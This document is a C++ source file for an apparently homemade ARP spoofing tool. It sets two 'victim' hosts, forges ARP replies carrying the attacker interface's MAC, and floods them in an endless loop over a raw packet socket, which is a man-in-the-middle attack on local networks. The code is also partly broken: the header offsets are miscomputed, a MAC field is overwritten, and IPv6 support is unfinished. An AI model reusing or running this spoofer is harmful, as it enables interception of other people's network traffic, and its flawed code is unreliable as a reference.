/*
 * spoofer.cpp
 *
 *  Created on: Apr 9, 2017
 *      Author: darthvader
 */

#include "spoofer.h"
#include "errormsg.h"

#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>

Spoofer::Spoofer() : m_protocol(ARP), m_ipType(Host::INVALID), m_interval(0), mp_host1(0), mp_host2(0) {
}

Spoofer::~Spoofer() {
}

void Spoofer::SetProtocolType(std::string t) {
	if (t == "arp")
		m_protocol = ARP;
	if (t == "ndp")
		m_protocol = NDP;
}

bool Spoofer::SetVictim1IP(std::string ip) {
	int ip_type = Host::IsValidIP(ip);
	if (ip_type == Host::IPv4) {
		m_ipType = Host::IPv4;
		unsigned char *p_ip = new unsigned char[4];
		Host::String2IPv4(ip.c_str(), p_ip);
		if (mp_host1 == 0)
			mp_host1 = new Host();
		mp_host1->AddIPv4(p_ip);
		delete[] p_ip;
		return true;
	}
	if (ip_type == Host::IPv6) {
		m_ipType = Host::IPv6;
//		TODO
		return true;
	}
	return false;
}

bool Spoofer::SetVictim2IP(std::string ip) {
	int ip_type = Host::IsValidIP(ip);
	if (ip_type == Host::IPv4) {
		m_ipType = Host::IPv4;
		unsigned char *p_ip = new unsigned char[4];
		Host::String2IPv4(ip.c_str(), p_ip);
		if (mp_host2 == 0)
			mp_host2 = new Host();
		mp_host2->AddIPv4(p_ip);
		delete[] p_ip;
		return true;
	}
	if (ip_type == Host::IPv6) {
		m_ipType = Host::IPv6;
//		TODO
		return true;
	}
	return false;
}

void *Spoofer::StartVictim1() {
	FillEthernetHeader((eth_header *)&m_arpPacket1 , 0);
	FillARPHeader((arp_header *)&m_arpPacket1 + sizeof(eth_header), 0);
	int sockfd = OpenSocket();
	if (sockfd < 0)
		print_msg_and_abort("Can not open socket!");
	ARPInjection(sockfd, &m_arpPacket1);
	return 0;
}

void *Spoofer::StartVictim2() {
	FillEthernetHeader((eth_header *)&m_arpPacket2, 0);
	FillARPHeader((arp_header *)&m_arpPacket2 + sizeof(eth_header), 0);
	int sockfd = OpenSocket();
	if (sockfd < 0)
		print_msg_and_abort("Can not open socket!");
	ARPInjection(sockfd, &m_arpPacket2);
	return 0;
}

bool Spoofer::SetVictim1MAC(std::string mac) {
	if (!Host::IsValidMAC(mac))
		return false;
	else {
		unsigned char *p_mac = new unsigned char[6];
		Host::String2MAC(mac.c_str(), p_mac);
		if (mp_host1 == 0)
			mp_host1 = new Host();
		mp_host1->SetMAC(p_mac);
		delete[] p_mac;
		return true;
	}
}

bool Spoofer::SetVictim2MAC(std::string mac) {
	if (!Host::IsValidMAC(mac))
		return false;
	else {
		unsigned char *p_mac = new unsigned char[6];
		Host::String2MAC(mac.c_str(), p_mac);
		if (mp_host2 == 0)
			mp_host2 = new Host();
		mp_host2->SetMAC(p_mac);
		delete[] p_mac;
		return true;
	}
}

void Spoofer::FillARPHeader(arp_header *h, unsigned int index) {
	h->hrd = htons(0x01);
	h->proto = htons(0x800);
	h->hrd_add_len = 0x06;
	h->proto_add_len = 0x04;
	h->op = htons(0x01);
	memcpy(h->smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
    if (index == 0) {
        memcpy(h->sip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
        memcpy(h->dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
        memcpy(h->dip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
    }
    else {
        memcpy(h->sip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
        memcpy(h->dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
        memcpy(h->dip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
    }
}

void Spoofer::Free() {
	mp_host1->Free();
	mp_host2->Free();
    mp_interface->Free();
}

void Spoofer::FillEthernetHeader(eth_header *h, unsigned int index) {
    memcpy(h->smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
    if (index == 0) {
        memcpy(h->smac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
    }
    else {
    	memcpy(h->smac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
    }
	h->ethType = htons(0x806);
}

void Spoofer::SetInterface(std::string inface) {
    m_interface = inface;
    mp_interface = new Interface(inface);
}

/**
 * @brief Open socket connection.
 * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
 */
int Spoofer::OpenSocket() {
	int sock = 0;
	struct sockaddr_ll iface;
	struct ifreq index;

	memset(&iface, 0, sizeof(iface));
	memset(&index, 0, sizeof(index));
	strncpy((char *)index.ifr_name, m_interface.c_str(), IFNAMSIZ);

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock < 0)
		return -1;
	if (ioctl(sock, SIOCGIFINDEX, &index) < 0)
		return -1;

	iface.sll_family = AF_PACKET;
	iface.sll_ifindex = index.ifr_ifindex;
	iface.sll_protocol = htons(ETH_P_ALL);

	if (bind(sock, (struct sockaddr *)&iface, sizeof(struct sockaddr_ll)) < 0)
		return -1;
	return sock;
}

/**
 * @brief Run ARP injection.
 * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
 */
void Spoofer::ARPInjection(int sockfd, arp_packet *h) {
	unsigned char *buffer = NULL;
	ssize_t byteSent = 0;

	buffer = (unsigned char *) h;
//		hex_dump((const unsigned char*)buffer, sizeof(struct ArpPacket));

	while(1)
	{
		byteSent = write(sockfd, buffer, ARP_PACKET_LEN);
		printf("\n  ARP packet write on wire, %d bytes :\n\n", ARP_PACKET_LEN);
		usleep(m_interval * 1000);
	}
	close(sockfd);
}
